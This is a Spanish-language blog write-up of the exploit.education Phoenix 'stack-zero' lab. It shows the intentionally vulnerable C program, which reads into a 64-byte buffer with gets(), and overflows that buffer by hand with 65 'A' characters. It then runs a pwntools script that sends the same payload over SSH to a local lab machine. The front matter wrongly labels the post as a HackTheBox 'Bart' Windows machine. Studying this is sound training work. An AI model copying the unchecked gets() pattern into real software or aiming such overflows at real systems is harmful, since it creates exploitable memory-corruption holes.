---
layout: single
title: Máquina Bart Hack the 
permalink: /pwn/phoenix/stack-zero/
comments: true
excerpt: "Máquina Bart Hack the Box"
date: 2022-05-09
classes: wide
header:
  teaser: /assets/images/2022-05-09-Bart/logo.png
  teaser_home_page: true
categories:
  - HacktheBox
tags:
  - Hackthebox
  - Windows
  - Hacking
  - Easy
---


# stack-zero

Este nivel introduce el concepto de que se puede acceder a la memoria fuera de su región asignada, cómo se disponen las variables de la pila y que la modificación fuera de la memoria asignada puede modificar la ejecución del programa.

```c
/*
 * phoenix/stack-zero, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

se ejecuta el binario y se le pasa un valor para ver el resultado

```c
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
A
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

Como vemos en el código dice que el buffer es de 64, así que imprimimos 65 caracteres en este caso 65 A

```c
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*65'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

Enviamos este valor y vemos que realizamos el desbordamiento del buffer 

```c
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!
```

Una vez que se realiza en local de forma manual, vamos a realizar un exploit para la explotación de este reto 

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/0_stack-zero]
└─# cat Remote_exploit.py 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Remote_exploit.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python3
   2   │ from pwn import *
   3   │ 
   4   │ #Define Las Varibles
   5   │ payload = b'A' * 65
   6   │ 
   7   │ # Se conecta al servidor por SSH
   8   │ ssh_connection = ssh(user='user', host='localhost', password='user', port=2222)
   9   │ 
  10   │ # Ejecuta el programa remoto
  11   │ process = ssh_connection.process(['/opt/phoenix/amd64/stack-zero'])
  12   │ 
  13   │ # Envía el payload 
  14   │ process.sendline(payload)
  15   │ 
  16   │ # captura la respuesta y la envía
  17   │ flag = process.recvall().decode()
  18   │ log.success("Output: " + flag)
  19   │ 
  20   │ # Cierra el proceso
  21   │ process.close()
  22   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
```

Ejecución del exploit

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/0_stack-zero]
└─# python3 Remote_exploit.py 
[+] Connecting to localhost on port 2222: Done
[*] user@localhost:
    Distro    Unknown 
    OS:       linux
    Arch:     amd64
    Version:  4.9.0
    ASLR:     Disabled
    SHSTK:    Disabled
    IBT:      Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process None on localhost: pid 526
[!] ASLR is disabled for '/opt/phoenix/amd64/stack-zero'!
[+] Receiving all data: Done (128B)
[*] Stopped remote process 'stack-zero' on localhost (pid 526)
[+] Output: Welcome to phoenix/stack-zero, brought to you by https://exploit.education
    Well done, the 'changeme' variable has been changed!
```